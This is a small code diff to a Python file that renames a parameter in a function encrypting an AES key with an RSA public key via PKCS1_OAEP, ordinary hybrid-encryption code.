@@ -88,8 +88,8 @@ def initialize_keys():
 
 
 # Encrypt KEY (AES) with public key (RSA).
-def encrypt_key(AESkey, key):
-    public_key = RSA.importKey(key)
+def encrypt_key(AESkey, keyEnc):
+    public_key = RSA.importKey(keyEnc)
     encryptor = PKCS1_OAEP.new(public_key)
     encrypted_key = encryptor.encrypt(AESkey)
     return encrypted_key
